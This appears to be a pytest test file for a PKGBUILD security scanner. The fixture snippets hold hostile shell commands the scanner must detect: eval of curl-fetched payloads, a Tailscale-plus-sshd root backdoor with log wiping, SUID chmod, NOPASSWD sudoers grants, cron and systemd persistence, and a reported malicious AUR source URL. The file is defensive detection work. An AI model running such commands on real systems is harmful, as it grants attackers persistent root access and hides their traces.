from aurascan.analyzers.deterministic import DeterministicAnalyzer
from aurascan.core.models import Phase, Severity


def analyze_text(text: str, phase=Phase.pkgbuild_static):
    return DeterministicAnalyzer().analyze_content("PKGBUILD", text, phase)


def rule_ids(findings):
    return {finding.rule_id for finding in findings}


def finding(findings, rule_id):
    return next(item for item in findings if item.rule_id == rule_id)


def test_eval_chain_detects_dynamic_eval_pattern():
    findings = analyze_text('build() {\n  eval "$generated_command"\n}\n')

    assert "EXEC-EVAL-001" in rule_ids(findings)
    eval_finding = finding(findings, "EXEC-EVAL-001")
    assert eval_finding.severity == Severity.HIGH
    assert eval_finding.requires_manual_review is True
    assert eval_finding.blocks_installation is False


def test_eval_comment_does_not_trigger():
    findings = analyze_text("# eval \"$(curl https://example.invalid/payload.sh)\"\n")

    assert "EXEC-EVAL-001" not in rule_ids(findings)
    assert "EXEC-EVAL-NET-001" not in rule_ids(findings)


def test_eval_network_decode_combo_is_blocking():
    findings = analyze_text("build() {\n  eval \"$(curl https://example.invalid/payload.sh)\"\n}\n")

    assert "EXEC-EVAL-NET-001" in rule_ids(findings)
    combo = finding(findings, "EXEC-EVAL-NET-001")
    assert combo.severity == Severity.CRITICAL
    assert combo.blocks_installation is True


def test_systemd_service_file_install_is_lower_severity_than_auto_enable():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$pkgdir/usr/lib/systemd/system/demo.service"\n}\n')

    assert "SYS-SYSTEMD-UNIT-001" in rule_ids(findings)
    unit = finding(findings, "SYS-SYSTEMD-UNIT-001")
    assert unit.severity == Severity.MEDIUM
    assert unit.blocks_installation is False


def test_systemd_enable_in_install_hook_requires_review():
    findings = analyze_text("post_install() {\n  systemctl enable demo.service\n}\n", Phase.install_hook_static)

    assert "SYS-SYSTEMD-AUTO-001" in rule_ids(findings)
    auto = finding(findings, "SYS-SYSTEMD-AUTO-001")
    assert auto.severity == Severity.HIGH
    assert auto.requires_manual_review is True


def test_systemd_user_service_persistence_detected():
    findings = analyze_text('package() {\n  install -Dm644 demo.service "$HOME/.config/systemd/user/demo.service"\n}\n')

    assert "SYS-SYSTEMD-USER-001" in rule_ids(findings)


def test_cron_file_install_detected():
    findings = analyze_text('package() {\n  install -Dm644 fixture.cron "$pkgdir/etc/cron.d/fixture"\n}\n')

    assert "SYS-CRON-FILE-001" in rule_ids(findings)


def test_crontab_command_detected():
    findings = analyze_text("post_install() {\n  crontab - <<'EOF'\n}\n", Phase.install_hook_static)

    assert "SYS-CRONTAB-001" in rule_ids(findings)


def test_cron_reboot_entry_detected():
    findings = analyze_text("post_install() {\n  printf '@reboot echo fixture\\n' > /tmp/fixture-cron\n}\n", Phase.install_hook_static)

    assert "SYS-CRON-REBOOT-001" in rule_ids(findings)


def test_trailing_comment_is_not_scanned():
    findings = analyze_text("pkgdesc='demo' # systemctl enable demo.service\n")

    assert "SYS-SYSTEMD-AUTO-001" not in rule_ids(findings)


def test_install_hook_sudo_execution_is_blocked():
    findings = analyze_text(
        "post_install() {\n  /usr/bin/sudo /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    privileged = finding(findings, "EXEC-INSTALL-HOOK-SUDO-001")
    assert privileged.severity == Severity.CRITICAL
    assert privileged.blocks_installation is True


def test_install_hook_sudo_in_comment_or_message_is_not_blocked():
    findings = analyze_text(
        "post_install() {\n"
        "  # /usr/bin/sudo /usr/bin/fixture-helper\n"
        "  echo 'Run /usr/bin/sudo /usr/bin/fixture-helper manually'\n"
        "  printf '; sudo /usr/bin/fixture-helper is an example\\n'\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_words_after_echo_are_not_command_positions():
    findings = analyze_text(
        "post_install() {\n"
        "  echo then sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_sudo_in_control_flow_is_blocked_and_evidence_is_redacted():
    findings = analyze_text(
        "post_install() {\n"
        "  if sudo /usr/bin/fixture-helper --auth-key=fixture-secret; then :; fi\n"
        "}\n",
        Phase.install_hook_static,
    )

    privileged = finding(findings, "EXEC-INSTALL-HOOK-SUDO-001")
    assert "fixture-secret" not in privileged.evidence_snippet
    assert privileged.evidence_snippet == "privileged sudo invocation in install hook"


def test_install_hook_sudo_user_privilege_drop_is_not_hard_blocked():
    findings = analyze_text(
        "post_install() {\n  sudo -H --user=fixture-user /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_sudo_as_root_or_with_group_only_is_blocked():
    root_findings = analyze_text(
        "post_install() {\n  sudo -u root /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )
    group_findings = analyze_text(
        "post_install() {\n  sudo -g fixture-group /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(root_findings)
    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(group_findings)


def test_install_hook_checks_each_sudo_command_on_a_line():
    findings = analyze_text(
        "post_install() {\n"
        "  sudo -u nobody true; sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_sudo_in_quoted_command_substitution_is_blocked():
    findings = analyze_text(
        'post_install() {\n  result="$(sudo /usr/bin/fixture-helper)"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_command_substitution_ignores_parenthesis_in_quotes():
    findings = analyze_text(
        'post_install() {\n  result="$(printf \')\'; sudo /usr/bin/fixture-helper)"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_install_hook_escaped_substitutions_in_double_quotes_are_not_commands():
    findings = analyze_text(
        'post_install() {\n'
        '  first="\\$(sudo /usr/bin/fixture-helper)"\n'
        '  second="\\`sudo /usr/bin/fixture-helper\\`"\n'
        '}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_inert_argument_boundaries_are_not_commands():
    findings = analyze_text(
        "post_install() {\n"
        "  commands=(sudo /usr/bin/fixture-helper)\n"
        "  echo $(date) sudo /usr/bin/fixture-helper\n"
        '  echo "$(date)" sudo /usr/bin/fixture-helper\n'
        "  echo ${value} sudo /usr/bin/fixture-helper\n"
        "  echo wow! sudo /usr/bin/fixture-helper\n"
        "}\n",
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" not in rule_ids(findings)


def test_install_hook_assignment_and_backtick_command_contexts_are_blocked():
    assignment = analyze_text(
        "post_install() {\n  value=$(date) sudo /usr/bin/fixture-helper\n}\n",
        Phase.install_hook_static,
    )
    substitution = analyze_text(
        'post_install() {\n  value="`sudo /usr/bin/fixture-helper`"\n}\n',
        Phase.install_hook_static,
    )

    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(assignment)
    assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(substitution)


def test_non_comment_hash_syntax_does_not_hide_later_sudo_command():
    cases = (
        "value=${name#prefix}; sudo /usr/bin/fixture-helper\n",
        ": ${name##*/}; sudo /usr/bin/fixture-helper\n",
        "echo foo#bar; sudo /usr/bin/fixture-helper\n",
    )

    for content in cases:
        findings = analyze_text(content, Phase.install_hook_static)
        assert "EXEC-INSTALL-HOOK-SUDO-001" in rule_ids(findings)


def test_correlated_tailscale_root_ssh_backdoor_is_blocked_without_exposing_key():
    findings = analyze_text(
        "tailscale up --auth-key=fixture-only --ssh\n"
        "/usr/sbin/sshd -D -f /etc/pacman.d/fixture-sshd\n"
        "journalctl --vacuum-time=1s\n"
    )

    backdoor = finding(findings, "REMOTE-ADMIN-BACKDOOR-001")
    assert backdoor.severity == Severity.CRITICAL
    assert backdoor.blocks_installation is True
    assert "fixture-only" not in backdoor.evidence_snippet
    assert "Tailscale auth-key enrollment" in backdoor.evidence_snippet


def test_reported_hyprland_fixes_source_repository_is_blocked():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text(f"source=('git+{source_url}' 'https://example.invalid/?token=fixture-secret')\n")

    reported = finding(findings, "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828")
    assert reported.severity == Severity.CRITICAL
    assert reported.blocks_installation is True
    assert "fixture-secret" not in reported.evidence_snippet


def test_reported_source_repository_is_found_in_multiline_source_array():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text("source=(\n  'git+" + source_url + "'\n)\n")

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" in rule_ids(findings)


def test_reported_hyprland_fixes_source_in_comment_does_not_trigger():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes.git"
    findings = analyze_text(f"# source=('git+{source_url}')\n")

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" not in rule_ids(findings)


def test_inert_reported_repository_references_do_not_claim_declared_source():
    source_url = "https://github." + "com/iusearch-hyprlandbtw/hyprland-fixes"
    findings = analyze_text(
        f"pkgdesc='Detector for {source_url}'\n"
        f"incident_reference='{source_url}'\n"
        f"source_reference=('{source_url}')\n"
        f"echo 'Do not install {source_url}'\n"
    )

    assert "SUPPLYCHAIN-AUR-HYPRLAND-FIXES-20260828" not in rule_ids(findings)


def test_tailscale_service_or_status_alone_is_not_a_backdoor_match():
    findings = analyze_text(
        "systemctl enable tailscaled\n"
        "tailscale status\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_disabled_tailscale_ssh_flag_is_not_a_remote_anchor():
    findings = analyze_text(
        "tailscale up --auth-key=fixture-only --ssh=false\n"
        "journalctl --vacuum-time=1s\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_quoted_remote_access_examples_are_not_treated_as_commands():
    findings = analyze_text(
        "echo 'tailscale up --auth-key=fixture-only --ssh'\n"
        "printf 'journalctl --vacuum-time=1s\\n'\n"
        "echo if tailscale up --auth-key=fixture-only --ssh\n"
        "echo then journalctl --vacuum-time=1s\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_quoted_ssh_config_or_disguised_name_without_path_is_not_remote_anchor():
    config_findings = analyze_text(
        'echo "Port 3333 PermitRootLogin yes"\n'
        "chmod 4755 /tmp/fixture-helper\n"
    )
    name_findings = analyze_text(
        'pkgdesc="mirrorlist-criteria"\n'
        "chmod 4755 /tmp/fixture-helper\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(config_findings)
    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(name_findings)


def test_alternate_root_ssh_config_near_pacman_path_is_remote_anchor():
    findings = analyze_text(
        "cat > /etc/pacman.d/fixture-sshd <<'EOF'\n"
        "Port 3333\n"
        "PermitRootLogin yes\n"
        "EOF\n"
        "chmod 4755 /tmp/fixture-helper\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" in rule_ids(findings)


def test_remote_access_pair_scan_handles_adversarial_escaped_newlines():
    findings = analyze_text(
        "Port 3333 " + (r"\n" * 80) + " no-root-login\n"
        "OnCalendar=hourly " + (r"\n" * 80) + " no-root-user\n"
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_shell_quote_mask_handles_many_unclosed_command_substitutions():
    findings = analyze_text('echo "' + ("$(" * 10_000) + '\n')

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_suid_and_sudoers_without_remote_anchor_are_not_called_a_backdoor():
    findings = analyze_text(
        'chmod 4755 "$target"\n'
        '%wheel ALL=(ALL) NOPASSWD: /usr/bin/fixture-helper\n'
    )

    assert "REMOTE-ADMIN-BACKDOOR-001" not in rule_ids(findings)


def test_numeric_suid_in_comment_does_not_block():
    findings = analyze_text("# chmod 4755 /usr/bin/fixture-helper\n")

    assert "SYS-CHMOD-001" not in rule_ids(findings)


def test_numeric_suid_in_quoted_documentation_does_not_block():
    findings = analyze_text('echo "chmod 4755 is unsafe"\n')

    assert "SYS-CHMOD-001" not in rule_ids(findings)


def test_sudoers_dropin_requires_review_and_nopasswd_blocks():
    dropin = analyze_text('install -Dm440 fixture "$pkgdir/etc/sudoers.d/fixture"\n')
    grant = analyze_text('%wheel ALL=(ALL) NOPASSWD: /usr/bin/fixture-helper\n')

    assert finding(dropin, "PRIV-SUDOERS-DROPIN-001").requires_manual_review is True
    assert finding(grant, "PRIV-SUDOERS-NOPASSWD-001").blocks_installation is True


def test_nopasswd_word_in_package_description_is_not_sudo_policy():
    findings = analyze_text('pkgdesc="Supports review of NOPASSWD: sudo policy"\n')

    assert "PRIV-SUDOERS-NOPASSWD-001" not in rule_ids(findings)


def test_numeric_suid_mode_is_blocked():
    findings = analyze_text('chmod 4755 "$target"\n')

    assert finding(findings, "SYS-CHMOD-001").blocks_installation is True
